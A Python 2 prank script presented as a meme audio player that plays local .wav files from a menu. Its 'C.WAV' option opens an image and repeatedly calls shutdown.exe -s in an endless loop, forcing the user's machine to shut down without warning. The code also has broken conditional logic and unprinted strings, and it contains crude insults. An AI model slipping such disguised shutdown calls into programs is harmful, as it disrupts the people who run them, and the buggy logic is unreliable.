#Don Jones Story
# _____________
#|   Get Out!  |
#|_____________|
#|#Richard Smith|
#|#_____________|
import math
import random
import sys
import struct
import time
import wave
import os
import subprocess
print (" ____________________ ")
print ("|   GLONES MACHINE   |")
print ("|      WARNING!      |")
print ("| PIF'S WILL NOT BE  |")
print ("|      MARKED        |")
print ("|____________________|")
choice_0 = raw_input("WARNING! Memes May Be Extra FRE$H, DO YOU WISH TO PROCEED? [Y|N]")
if choice_0 == 'y' or choice_0 == 'Y':
    print ("Get Ready")
elif choice_0 == 'n' or choice_0 == 'N':
    print ("In A Shit M8")
    sys.exit(1)
else:
    ("An Error Occured, fatal blow by Big Dones") 

def choice():
    for i in range(0,1):
        i = ["|D|||O|||N|"]
        time.sleep(1)
        print i 
    for ix in range (0,1):
        ix = ["||||I|S||||"]
        time.sleep(1)
        print ix
    for ixx in range (0,1):
        ixx = ["G||L||Y||N|"]
        time.sleep(1)
        print ixx
        time.sleep(3)
        number = 0
        print ("Importing Smeg Jar" )  
        time.sleep(5)
        print ("Importing Unmarked PIF")
        time.sleep(5)
        print ("Importing SR71")
        time.sleep(5)
        print ("Importing Fon Media")
        print ("ITS DON")
        print ("Fon Media Succesfully Dissolved") 
choice()
def choiceA():
    print ("P1|P2|P3|P4|P5|C.WAV")
    B = raw_input("PLEASE ENTER THE PART YOU WOULD LIKE TO LISTEN TO:")
    print ("You have selected" + ' ' + B +' ' + "IS THIS CORRECT")
    Bi = raw_input("Y|N")
    if (Bi == "Y" or Bi == "y" and B == "P1" or B == "p1"):
            time.sleep(2)
            print ("LOADING")
            time.sleep(2) 
            print ("FETCHING DATA FROM SERVER ROOM")
            time.sleep(2)
            print ("FETCHED BY GLYN")
            print ("DONE'S HAS LAUNCHED")
            os.system("start, PT1.wav")
            choiceA()
    elif (Bi == "Y" or Bi == "y" and B == "P2" or B == "p2"):
        time.sleep(2)
        print ("BACK FOR MORE")
        print ("LOADING")
        time.sleep(2)
        print ("FETCHING MORE DATA FROM THE MEME FARM")
        time.sleep(2)
        print ("FETCHED BY GLYN")
        print ("DONE's HAD LAUNCHED")
        os.system("start, PT2.wav")
        choiceA()
    elif (Bi == "Y" or Bi == "y" and B == "P3" or B == "p3"):
        time.sleep(2)
        print("Rubery?")
        print("LOADING")
        time.sleep(2)
        print ("FETCHING THE .WAV's")
        time.sleep(2)
        print ("ALL .WAV's DISSOLVED")
        os.system("start, PT3.wav")
        choiceA()
    elif (Bi == "Y" or Bi == "y" and B =="P4" or B == "p4"):
        time.sleep(2)
        print("GETTING CA$H GLYN HAND")
        print("LOADING")
        time.sleep(2)
        print("GETTING THE BONK")
        time.sleep(2)
        print("CASH EXCHANGED LAUNCHING RUBERY")
        time.sleep(1)
        os.system("start, PART4.wav")
        choiceA()
    elif (Bi == "Y" or Bi == "y" and B== "P5" or B == "p5"):
        time.sleep(2)
        print("GROPING BIG BALLS")
        print("LOADING")
        time.sleep(2)
        print("BAllS POPPED")
        time.sleep(2)
        os.system("start, PT5.wav")
        choiceA()
    elif (Bi == "Y" or Bi == "y" and B == "C.WAV" or B == "C.WAV"):
        time.sleep(2)
        print ("Coombes?")
        print ("LOADING GLYN")
        time.sleep(2)
        ("FETCHING CASES")
        time.sleep(2)
        print("CASES OPENED RIP KNIFE")
        xx = 100
        while xx != 95:
            time.sleep(1)
            os.system("open, RIP.png")
            subprocess.call(["shutdown.exe", "-s", "1"])
            xx == xx - 1
    elif (Bi == "N" or Bi == "n"):
        time.sleep(2)
        print ("Thick Cunt")
        choiceA()
    else:
        print ("Errors Occured")
        choiceA() 
choiceA()
